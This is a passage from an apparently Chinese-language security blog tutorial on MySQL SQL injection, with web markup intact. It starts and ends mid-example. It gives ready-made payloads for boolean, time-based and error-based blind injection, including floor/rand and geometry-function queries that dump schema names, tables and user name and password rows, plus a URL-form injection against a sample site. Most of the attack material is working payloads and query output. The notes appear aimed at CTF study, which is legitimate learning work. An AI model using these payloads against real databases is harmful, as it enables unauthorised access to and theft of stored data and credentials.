 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-----------------+</span><span class="token operator">|</span> <span class="token string">'ab'</span> <span class="token operator">&lt;</span> <span class="token string">'azzzzz'</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-----------------+</span><span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-----------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="token comment">#mysql比较，从第一个字符还是比较ascii的大小，一次往后</span><span class="token comment">#并且多列的比较时从第一列的第一位开始的</span>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">------------------------------------------------------+</span><span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------------------------------------------------------+</span><span class="token operator">|</span>                                                    <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span>                                                     <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span>                                                     <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'Dumb'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token operator">|</span>                                                     <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">-------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="token comment">#通过比较可以将三列的数据全部盲注出来</span></code></pre><pre class="language-none"><code class="language-none">((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))</code></pre><p>要求后面select的结果必须是一行，可以通过limit限制一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。</p><h2 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h2><p>何为盲注？盲注就是在sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><h3 id="基于布尔SQL-盲注"><a href="#基于布尔SQL-盲注" class="headerlink" title="基于布尔SQL 盲注"></a>基于布尔SQL 盲注</h3><h4 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h4><p>在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。</p><p><strong>mid()</strong></p><blockquote><p>mid(s,n,len);</p><p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO</code></pre><p><strong>substr()/substring()</strong></p><blockquote><p>substr(s, start, length);</p><p>substring(s, start, length)</p><p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO                                </code></pre><p><strong>left()</strong></p><blockquote><p>left(s,n);</p><p>返回字符串 s 的前 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT LEFT('runoob',2);-- ru</code></pre><p><strong>right()</strong></p><blockquote><p>right(s,n);</p><p>返回字符串 s 的后 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT right('runoob',2);-- ob</code></pre><p><strong>ascii()/ord()</strong></p><blockquote><p>ascii(s);/ord(s);</p><p>返回字符串 s 的第一个字符的 ASCII 码。</p><p>这里不考虑多字节字符，比如汉字</p></blockquote><p><strong>trim()/rtrim()/ltrim()</strong></p><blockquote><p>ltrim(s);</p><p>去掉字符串s开始处的空格</p><p>rtrim(s);</p><p>去掉字符串s结尾处的空格</p><p>trim(s);</p><p>去掉字符串开始和结尾处的空格</p></blockquote><pre class="language-none"><code class="language-none">SELECT TRIM('    RUNOOB    ') AS TrimmedString;-- RUNOOBSELECT RTRIM("RUNOOB     ") AS RightTrimmedString;   -- RUNOOBSELECT LTRIM("    RUNOOB") AS LeftTrimmedString;-- RUNOOB</code></pre><p>这个怎么用来截取字符串呢？</p><pre class="language-none"><code class="language-none">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）BOTH删除两边的指定字符串LEADING删除左边的指定字符串TARILING删除右边的指定字符串select trim(LEADING "a" from "abcd") = trim(LEADING "b" from "abcd");以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b当这个结果返回0时，则第一个字符是a或者b。接着让a的ASCII+2变成c，如果返回1，则字符串第一位为a，反之第一位为b。这样做的目的是为了方便写脚本第二个字符判断select trim(LEADING "aa" from "abcd") = trim(LEADING "ab" from "abcd");接着重复上面的过程，判断第二个字符以此推出整个字符串如果=用regexp替代那么正确的字符一定在regexp前面以这个abcd为例Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1因此只需判断第一步即可，而不需要ASCII+2去判断了注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符例如：select trim(LEADING "b" from trim(LEADING "a" from "abcd"));-- cd先截断a，返回字符串bcd，在截断b，返回字符串cd</code></pre><p><strong>注：可以看到这个函数可以不使用</strong>**,<strong><strong>的，如果</strong></strong>,**<strong>被过滤可以使用</strong></p><p><strong>INSERT()</strong></p><blockquote><p>INSERT(s1,x,len,s2)</p><p>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT INSERT("google.com", 1, 6, "runoob");  -- 输出：runoob.comSELECT INSERT("google.com", 1,2, "runoob");-- 输出：runoobogle.com如何使用呢？第一步删除起始的前x位第二步套娃删除x+1位以后的所有根据这两步我们就能取出字符串的任意位置的字符，也就相当于字符串的截取例子：第一步删除起始的前x位SELECT INSERT("abcdef", 1,0, "");-- 输出：abcdefSELECT INSERT("abcdef", 1,1, "");-- 输出：bcdef第二步套娃删除x+1位以后的所有SELECT INSERT((INSERT("abcdef", 1,0, "")),2,9999,"");-- 输出：aSELECT INSERT((INSERT("abcdef", 1,1, "")),2,9999,"");-- 输出：b可以看到我们只要改变中间的数字，就可以输出任意位置的字符</code></pre><p><strong>注：TRIM和INSERT函数比较特别，基本上是不会被过滤了，如果常用的截取函数不能用时，可选择这两个函数</strong></p><p><strong>if/case</strong></p><p>用在select查询当中，当做一种条件来进行判断</p><p>基本语法：if(条件,为真结果,为假结果)</p><p><strong>case基本语法</strong></p><pre class="language-none"><code class="language-none">MySQL 的 case when 的语法有两种：简单函数 CASE [col_name] WHEN [value1] THEN [result1]…ELSE [default] END搜索函数 CASE WHEN [expr] THEN [result1]…ELSE [default] ENDselect case 'a' when 'a' then 1 else 0 end;-- 1select case when 98&gt;12 then 1 else 0 end;</code></pre><p><strong>注：可以看出case的用法与if类似，当if被过滤或者</strong>**,**<strong>被过滤可以替换为case，并且在时间盲注中，条件语句非常有用！</strong></p><h4 id="regexp-rlike-正则表达式注入"><a href="#regexp-rlike-正则表达式注入" class="headerlink" title="regexp/rlike 正则表达式注入"></a><strong>regexp/rlike 正则表达式注入</strong></h4><p>用法介绍：select user() regexp ‘^[a-z]’; Explain：正则表达式的用法，user()结果为root，regexp 为匹配root 的正则表达式。 第二位可以用select user() regexp ‘^ro’来进行。</p><p>结果返回0或者1.</p><p><strong>示例介绍：</strong></p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));select * from users where id=1 and 1=(user() regexp'^ri');</code></pre><p>通过if 语句的条件判断，返回一些条件句，比如if 等构造一个判断。根据返回结果是否等于0 或者1 进行判断。</p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</code></pre><p>这里利用select 构造了一个判断语句。我们只需要更换regexp 表达式即可</p><p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p><p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp ‘^username$’来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql 使用手册进行了解。</p><p>但是这种做法是错误的，limit 作用在前面的select 语句中，而不是regexp。那我们该如何选择。其实在regexp 中我们是取匹配table_name 中的内容，只要table_name 中有的内容，我们用regexp 都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。</p><p><strong>注：</strong><code>regexp是不区分大小写的，需要大小写敏感需要加上binary关键字</code></p><pre class="language-none"><code class="language-none">select binary database() regexp "^CTF";</code></pre><h4 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a><strong>like 匹配注入</strong></h4><p>和上述的正则类似，mysql 在匹配的时候我们可以用like 进行匹配S。</p><p>这里可以用于过滤<code>=</code>使用</p><p>用法：select user() like ‘ro%’</p><h3 id="基于时间的SQL-盲注延时注入"><a href="#基于时间的SQL-盲注延时注入" class="headerlink" title="基于时间的SQL 盲注延时注入"></a>基于时间的SQL 盲注延时注入</h3><pre class="language-none"><code class="language-none">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23--if 判断语句，条件为假，执行sleep</code></pre><p>Ps：遇到以下这种利用sleep()延时注入语句</p><pre class="language-none"><code class="language-none">select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));</code></pre><p>该语句意思是在0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p><p><strong>benchmark</strong></p><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数比SHAI()函数要快</p><pre class="language-none"><code class="language-none">select benchmark(1000000,sha1(sha1(sha1(sha1("1")))));</code></pre><pre class="language-none"><code class="language-none">UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</code></pre><p><strong>笛卡儿积</strong></p><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><p>1.<code>count()</code>函数是用来统计表中记录的一个函数，返回匹配条件的行数。 2.<code>count()</code>语法： （1）<code>count(*)</code>—包括所有列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为NULL的记录。 （2）<code>count(1)</code>—忽略所有列，1表示一个固定值，也可以用<code>count(2)</code>、<code>count(3)</code>代替，在统计结果的时候，不会忽略列值为<code>NULL</code>的记录。 （3）<code>count(列名)</code>—只包括列名指定列，返回指定列的记录数，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 （4）<code>count(distinct 列名)</code>—只包括列名指定列，返回指定列的不同值的记录数，在统计结果的时候，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 3.<code>count(*)&amp;count(1)&amp;count(列名)</code>执行效率比较： （1）如果列为主键，<code>count(列名)</code>效率优于<code>count(1)</code> （2）如果列不为主键，<code>count(1)</code>效率优于<code>count(列名)</code> （3）如果表中存在主键，<code>count(主键列名)</code>效率最优 （4）如果表中只有一列，则<code>count(*)</code>效率最优 （5）如果表有多列，且不存在主键，则<code>count(1)</code>效率优于<code>count(*)</code></p><pre class="language-none"><code class="language-none">select count(*) from information_schema.columns A;1 row in set (1.47 sec)</code></pre><p><strong>get_lock</strong></p><pre class="language-none"><code class="language-none">SELECT GET_LOCK(key, timeout) FROM DUAL;SELECT RELEASE_LOCK(key) FROM DUAL;</code></pre><p>其中GET_LOCK()和RELEASE_LOCK()分别是两个函数，并且有参数和返回值，这里的DUAL是伪表，在Oracle中很常见，就是一个不存在的表，用来临时记录值的。</p><ul><li>GET_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。</li><li>这里假设连接A先GET_LOCK(“lock_test”, 10)，因为lock_test这个字段在之前没有加锁所以不需要等待，直接返回1，加锁成功。 然后连接B再GET_LOCK(“lock_test”, 10)，等待10s，若这期间没有释放这个字段的锁，则10s过后返回0，连接B加锁失败。 这里的问题就是这个加锁方式很危险，一旦加锁之后忘记释放，就会一直锁住这个字段，除非连接断开。尤其是第二个参数，千万不要理解成超时时间，并不是设置一个字段的锁，然后超过这个时间就自动释放了，这个是等待时间，即第二次对同一个字段加锁，等待多久然后返回。</li><li>这个RELEASE_LOCK就没什么好说的了，记得加锁之后释放就可以了，成功释放回返回1。</li></ul><p>在一个连接session中可以先锁定一个变量，例如：<code>select get_lock('aaa',1);</code></p><p>然后再通过另一个连接session，再次执行get_lock函数：<code>select get_lock('aaa',2);</code>，此时将产生2秒的延时。</p><pre class="language-none"><code class="language-none">//第一个连接mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 1 |+-------------------+1 row in set (0.00 sec)//打开另一个cmd  再次连接mysql，执行get_lock，发现延时mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 0 |+-------------------+1 row in set (1.00 sec)</code></pre><p>利用场景是有条件限制的：需要提供长连接。在<code>Apache+PHP</code>搭建的环境中需要使用<code>mysql_pconnect(打开一个到 MySQL 服务器的持久连接)</code>函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p><p><strong>正则表达式</strong></p><p>正则匹配在匹配较长字符串单自由度比较高的字符串时，会有大量的回溯，造成较大的计算量</p><pre class="language-none"><code class="language-none">select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');mysql&gt; select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');+-------------------------------------------------------------+| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |+-------------------------------------------------------------+|                                                           0 |+-------------------------------------------------------------+1 row in set (2.94 sec)</code></pre><h3 id="基于报错的SQL-盲注"><a href="#基于报错的SQL-盲注" class="headerlink" title="基于报错的SQL 盲注"></a>基于报错的SQL 盲注</h3><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数</p><p>报错注入就是利用了数据库的某些机制，认为的制造错误条件，使得查询结果能够 出现在错误信息中。</p><p>构造payload 让信息通过错误提示回显出来</p><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></pre><p>参考：<a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p><p><strong>floor()</strong></p><blockquote><p>floor(x)</p><p>返回小于或等于 x 的最大整数　　</p></blockquote><pre class="language-none"><code class="language-none">SELECT FLOOR(1.5) -- 返回1</code></pre><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</code></pre><p>以上语句可以简化成如下的形式。</p><pre class="language-none"><code class="language-none">select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))</code></pre><p>如果关键的表被禁用了，可以使用这种形式</p><pre class="language-none"><code class="language-none">select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))</code></pre><p>如果rand 被禁用了可以使用用户变量来报错</p><pre class="language-none"><code class="language-none">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">爆库<span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x <span class="token punctuation">)</span>a<span class="token punctuation">;</span>http:<span class="token comment">//www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span>爆表<span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span>爆字段<span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span>‘users’ <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span>爆数据<span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>passwd<span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>birth<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>’<span class="token operator">|</span>’<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>passwd<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> users <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a</code></pre><p><strong>几何函数</strong></p><pre class="language-none"><code class="language-none">GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>不存在函数</strong></p><pre class="language-none"><code class="language-none">可以用来爆数据库select a();ERROR 1305 (42000): FUNCTION mysql.a does not exist</code></pre><p><strong>name_const()</strong></p><pre class="language-none"><code class="language-none">仅可取数据库版本信息select * from(select name_const(version(),0x1),name_const(version(),0x1))a;ERROR 1060 (42S21): Duplicate column name '5.5.29'</code></pre><p><strong>uuid相关函数</strong></p><pre class="language-none"><code class="language-none">适用版本：8.0.xmysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</code></pre><p><strong>exp()</strong></p><blockquote><p>exp(int)</p><p>返回e的x次方</p><p>适用版本：版本在5.5.5~5.5.49</p></blockquote><pre class="language-none"><code class="language-none">select exp(~(select * FROM(SELECT 